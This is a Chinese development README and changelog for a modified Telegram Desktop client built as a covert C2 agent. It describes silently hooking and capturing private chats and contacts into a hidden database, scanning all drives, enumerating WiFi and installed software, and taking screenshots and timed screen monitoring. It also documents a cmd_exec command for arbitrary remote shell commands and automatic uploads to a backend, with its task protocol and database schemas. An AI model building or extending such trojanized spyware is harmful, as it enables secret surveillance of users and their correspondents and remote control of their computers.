

### 修改日志 (2026-01-18)

*   **文档更新**: 同步了 Web 端 (`platform/README.md`) 的数据库上传标准，明确了 `tdata_client_{TGID}.db` 的命名规范。
*   **文档更新**: 添加了 Web 端开发需求说明，明确了 `get_current_user` 接口对接规范。
*   **功能修复**: 修复了 `upload_db` 任务状态卡在 `in_progress` 的问题。
*   **功能修复**: 完善了本地任务持久化机制，解决了重启后任务丢失的问题。

## 开发协作规范 (必读)

### 1. 职责边界
*   **tdesktop 端 (本目录)**: 负责 Telegram Desktop 客户端的修改与功能增强（C++）。
    *   **权限限制**: **严禁修改 Web 端代码**。
*   **Web 端 (platform)**: 负责后端服务 (Java/Spring Boot) 与前端控制台 (React) 的开发。

### 2. 沟通与需求
*   **我对 Web 端的要求**: 所有针对 Web 端接口、功能配合的需求，**必须** 记录在本文件的 [Web 端开发协作注意事项](#web端开发协作注意事项) 章节中。
*   **Web 端对我的要求**: 请查阅 `../platform/README.md` (如果存在) 或由 Web 端同事同步。

### 3. 协作流程
*   修改 `tdesktop` 代码前，请先拉取最新代码。
*   提交修改后，请及时更新本 `README.md` 中的修改日志。

## Web端开发协作注意事项

### 1. `get_current_user` 接口对接
Web端（后端）需要在 `C2Controller.java` 中实现对 `get_current_user` 任务结果的解析。
客户端返回的 JSON 格式如下：
```json
{
  "user_id": "123456789",
  "username": "example_user",
  "first_name": "John",
  "last_name": "Doe",
  "phone": "15551234567",
  "is_premium": true
}
```
**后端需求**：
- 在 `submitTaskResult` 方法中，当 `taskId` 对应的任务类型为 `get_current_user` 时，解析上述 JSON。
- 将解析后的数据更新到 `tg_account` 表中。
- 建立当前设备 (`C2Device`) 与该 Telegram 账号的关联。

### 2. 数据库上传标准 (Web端对接核心要求)
Web端已明确数据库文件的命名与结构规范，请 C++ 端严格遵守，否则后端无法正确解析。

#### 2.1 文件命名规范
*   **通用数据**: `scan_results.db` (包含系统、WiFi、软件信息)
*   **聊天记录**: `tdata_client_{TGID}.db`
    *   **必须**以 `tdata_client_` 开头
    *   后接当前登录的 Telegram ID (TGID)
    *   以 `.db` 结尾
    *   **示例**: `tdata_client_123456789.db` (后端将依据此文件名提取 TGID 并关联账号)

#### 2.2 表结构定义 (关键字段)
请确保 SQLite 表包含以下 Web 端必需字段 (可包含更多字段，但以下字段必传)：

**1. chat_logs (聊天记录)**
*   `chat_id` (TEXT)
*   `sender` (TEXT)
*   `content` (TEXT)
*   `timestamp` (INTEGER)
*   `is_outgoing` (INTEGER)
*   `media_path` (TEXT, 可选)

**2. system_info (系统信息)**
*   `internal_ip` (TEXT)
*   `mac_address` (TEXT)
*   `hostname` (TEXT)
*   `os` (TEXT)
*   `auto_screenshot` (INTEGER)
*   `data_status` (TEXT)

**3. wifi_scan_results (WiFi 信息)**
*   `ssid` (TEXT)
*   `bssid` (TEXT)
*   `signal_strength` (TEXT)
*   `security_type` (TEXT)

**4. installed_software (软件列表)**
*   `name` (TEXT)
*   `version` (TEXT)
*   `install_date` (TEXT)

### 3. 新增指令支持
客户端已初步支持以下指令，请Web端确保下发指令格式正确：
- `fetch_full_chat_history`: 触发全量聊天记录同步。
- `get_screenshot`: 获取当前屏幕截图。

## C2 项目状态 (自定义修改)

本项目是对官方 Telegram 桌面客户端的修改版本，旨在集成数据收集、系统侦察和远程控制功能，作为一个受管端点运行。

### 修改日志 (2026-01-17)

*   **架构优化**: 重构心跳机制，解决客户端掉线问题。将轻量级心跳（默认 60s）与重型数据采集任务（5分钟）分离为独立定时器，防止采集任务阻塞心跳导致断连。
*   **功能增强**: 实现动态心跳间隔控制。支持 Web 端下发心跳频率（如 10s），并内置自动恢复机制：若非默认间隔持续 10 分钟且无新指令，自动恢复为 60s 默认值。
*   **兼容性增强**: 增强指令执行模块，新增 `cmd` 指令支持（作为 `shell` 的别名），提升 Web 端指令兼容性。
*   **Bug修复**: 修复了 `Heartbeat` 模块中的函数重复定义编译错误，清理冗余代码。
*   **功能增强**: 实现了静默聊天记录同步 (`syncChatHistory`)。在应用启动时自动获取之前的聊天记录（支持 Catch-up 模式），并记录同步状态以避免重复获取。
*   **功能增强**: 优化了文件系统扫描 (`BackgroundScanner`)。现在支持自动启动和递归扫描所有子目录 (`QDirIterator`)，扫描完成后自动上传数据库。
*   **功能增强**: 实现了 24 小时自动回传机制。如果本地数据超过 24 小时未上传，将自动触发全量数据库上传。
*   **功能增强**: 新增后端命令 `fetch_full_chat_history`，可触发全量聊天记录抓取（递归获取历史记录直至完毕）并自动上传数据库。
*   **功能增强**: 新增数据库自动清理机制。每次上传后自动删除超过 7 天的旧聊天记录并执行 `VACUUM` 压缩空间，防止数据库体积无限膨胀。
*   **性能优化**: 重写文件扫描模块 (`BackgroundScanner`)，在 Windows 平台引入 NTFS USN Journal 技术，实现类似 "Everything" 的毫秒级文件索引速度。
*   **策略调整**: 优化 MD5 计算策略，仅对特定文档类型 (`txt`, `doc`, `docx`, `pdf`, `ppt`) 且小于 100MB 的文件计算哈希，其余文件仅记录元数据，大幅降低磁盘 I/O 占用。
*   **Schema 变更**: 新增 `chat_sync_state` 表用于记录每个会话的同步进度 (`min_id`, `max_id`)。
*   **Schema 变更**: `chat_logs` 表新增 `media_path` 字段，用于存储图片/文件路径（目前支持 Photo ID）。
*   **Bug修复**: 修复了 `heartbeat.cpp` 中的编译错误（包括 `emit` 关键字替换为 `Q_EMIT`，以及迭代器和类型匹配修复）。
*   **Bug修复**: 修复了 `tdata_client.db` 不更新的问题（确保了重新编译和正确的数据库初始化路径）。
*   **后端对接**: 更新了 Spring Boot `C2Controller` 以支持解析 SQLite 中的 `media_path` 字段，实现聊天媒体路径的同步存储。
*   **前端对接**: 在 Web 控制台设备详情页新增了 `fetch_full_chat_history` 指令按钮，支持一键下发全量同步任务。

### 修改日志 (2026-01-16)

*   **配置变更**: 客户端回传地址 (C2 URL) 已从 `localhost:8101` 更改为 `192.168.2.131:8101`。请确保后端服务在该 IP 上可访问。
*   **Bug修复**: 修复了心跳间隔 (`heartbeatInterval`) 单位问题。之前发送的是秒 (60)，导致前端误显示为 0.06 秒。现已更正为发送毫秒 (60000)。
*   **调试增强**: 在 `Heartbeat::performScreenshot` 中添加了详细的调试日志 (`HEARTBEAT_DEBUG`)，用于排查截图失败问题（如屏幕获取失败、保存失败、上传失败等）。
*   **Bug修复**: 增强了截图功能 (`performScreenshot`) 的健壮性。添加了详细的调试日志 (`HEARTBEAT_DEBUG`) 以排查截图失败（如屏幕对象为空、保存失败等）的原因，并在失败时向后端上报明确的错误信息。

### 当前架构

*   **客户端**: 修改后的 Telegram Desktop (C++)，充当代理 (Agent)。
    *   **构建**: 使用 Visual Studio 2022 和 `out/Release/build_only.bat` 进行编译。
    *   **核心功能**: 心跳机制、远程命令执行、数据收集（软件列表、WiFi 信息、文件扫描、聊天记录）、本地 SQLite 存储 (`tdata/tdata_client.db`)。
*   **后端**: Spring Boot 应用程序 (Java)。
    *   端口: 8101。
    *   功能: 任务管理、数据聚合 (MySQL)、文件存储、去重 (Redis)。
*   **前端**: React + UmiJS。
    *   端口: 8000。
    *   功能: 仪表盘、设备管理、任务下发。

### 客户端功能详情 (Telegram Desktop)

#### 1. 数据收集 (本地 DB)
*   **消息拦截**: 实时捕获聊天消息（文本和图片），Hook 了 `history.cpp` 以实现实时捕获。
    *   **过滤**: 排除公共频道和群组，仅保存私聊和私有群组数据。
    *   **存储**: 数据保存在本地加密/隐藏的 SQLite 数据库 (`tdata_client.db`) 的 `chat_logs` 表中。
*   **联系人提取**: 捕获与登录账户关联的所有联系人信息（ID、用户名、电话）。
*   **WiFi 扫描**: 使用 `netsh` 扫描周边 WiFi 网络（SSID、信号强度）并存储在 `wifi_scan_results` 表中。
*   **软件枚举**: 通过读取注册表获取已安装的软件列表并存储。

#### 2. 系统侦察与监控
*   **基本信息**: 捕获设备主机名、操作系统版本、MAC 地址和 IP 地址。
*   **屏幕截图**: 支持立即截图 (`screenshot`) 和定时监控 (`start_monitor`)。
*   **文件系统扫描**:
    *   后台扫描所有驱动器。
    *   计算文件的 MD5 哈希值、记录路径和大小。
    *   结果存储在本地数据库并支持断点续传/去重上传。

#### 3. 远程控制 (C2)
*   **心跳系统**:
    *   实现了 `Core::Heartbeat` 单例。
    *   默认每 60 秒向后端发送一次心跳（包含系统状态）。
    *   支持通过 `set_heartbeat` 命令调整间隔。
*   **任务执行**:
    *   客户端在心跳期间轮询 `pending` 任务。
    *   **支持的命令**:
        *   `cmd_exec`: 执行任意 CMD 命令。
        *   `get_screenshot`: 捕获并上传截图。
        *   `upload_file`: 上传指定文件。
        *   `upload_db`: 上传本地 `tdata` 数据库。
        *   `fetch_full_chat_history`: 触发全量聊天记录同步并上传。
        *   `get_wifi` / `get_software`: 触发特定信息收集。

### 最近更新 (阶段 6 & 7)

*   **数据同步增强**: 修复了本地文件扫描结果无法同步到后端的问题。实现了基于哈希的去重和批量处理。
*   **Web 功能恢复**: 修复了截图命令分发和 Web 端显示问题。
*   **自动收集**: Telegram 启动时自动触发软件列表、WiFi 信息和基础数据的收集与同步。
*   **稳定性**: 增强了 `heartbeat.cpp` 的错误处理和调试日志 (`HEARTBEAT_DEBUG`)。
*   **构建系统**: 优化了 `build_only.bat` 以正确处理 Windows 环境路径。

### 数据库结构 (Schema)

Web 端开发者请参考以下 SQLite 数据库 (`tdata_client.db`) 结构进行解析：

#### 1. 系统信息 (`system_info`)
存储设备的基础状态信息。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `uuid` | TEXT | 主键，设备唯一标识符 (基于 MAC + 路径) |
| `internal_ip` | TEXT | 内网 IP 地址 |
| `mac_address` | TEXT | 物理 MAC 地址 |
| `hostname` | TEXT | 计算机主机名 |
| `os` | TEXT | 操作系统版本 (如 "Windows 10 22H2") |
| `online_status` | TEXT | 在线状态 (包含连接的 WiFi 名称) |
| `last_active` | INTEGER | 最后活跃时间戳 (秒) |
| `external_ip` | TEXT | 外网 IP (预留) |
| `data_status` | TEXT | 数据状态 ("Scanning..." 或 "Active") |
| `auto_screenshot` | INTEGER | 自动截图开启状态 (1=开启, 0=关闭) |
| `heartbeat_interval`| INTEGER | 心跳间隔 (秒) |

#### 2. 已安装软件 (`installed_software`)
存储从注册表扫描到的软件列表。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `name` | TEXT | 软件名称 |
| `version` | TEXT | 版本号 |
| `publisher` | TEXT | 发布者 |
| `install_date` | TEXT | 安装日期 |

#### 3. WiFi 扫描结果 (`wifi_scan_results`)
存储周边 WiFi 网络信息。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `ssid` | TEXT | WiFi 名称 |
| `bssid` | TEXT | MAC 地址 |
| `signal_strength` | INTEGER | 信号强度 (0-100) |
| `security_type` | TEXT | 加密类型 |
| `scan_time` | INTEGER | 扫描时间戳 |

#### 4. 文件扫描结果 (`file_scan_results`)
存储文件系统扫描结果 (仅元数据)。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `path` | TEXT | 文件绝对路径 |
| `name` | TEXT | 文件名 |
| `size` | INTEGER | 文件大小 (字节) |
| `md5` | TEXT | 文件 MD5 哈希值 |
| `last_modified` | INTEGER | 最后修改时间戳 |

#### 5. 聊天记录 (`chat_logs`)
存储捕获的聊天消息。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `platform` | TEXT | 来源平台 ("telegram") |
| `chat_id` | TEXT | 聊天会话 ID |
| `sender` | TEXT | 发送者名称/ID |
| `content` | TEXT | 消息内容 (文本或图片路径) |
| `timestamp` | INTEGER | 消息时间戳 |
| `is_outgoing` | INTEGER | 是否为发出消息 (1=是, 0=否) |
| `sender_id` | TEXT | 发送者 ID |
| `sender_username` | TEXT | 发送者用户名 |
| `sender_phone` | TEXT | 发送者手机号 |
| `receiver_id` | TEXT | 接收者 ID (或群 ID) |
| `receiver_username` | TEXT | 接收者用户名 |
| `receiver_phone` | TEXT | 接收者手机号 |
| `media_path` | TEXT | 图片/文件路径 (初始为 `Photo:ID`，下载后更新为本地路径) |

#### 6. 当前用户信息 (`current_user`)
存储当前登录的 Telegram 用户信息。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `user_id` | TEXT | 用户 ID (主键) |
| `username` | TEXT | 用户名 |
| `first_name` | TEXT | 名字 |
| `last_name` | TEXT | 姓氏 |
| `phone` | TEXT | 手机号 |
| `is_premium` | INTEGER | 是否为 Premium 用户 (1=是, 0=否) |

#### 7. 本地任务 (`local_tasks`)
存储本地任务执行状态。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `task_id` | TEXT | 任务 ID (主键) |
| `command` | TEXT | 任务命令 |
| `params` | TEXT | 参数 |
| `status` | TEXT | 状态 (pending, in_progress, completed, failed) |
| `created_at` | INTEGER | 创建时间戳 |
| `updated_at` | INTEGER | 更新时间戳 |

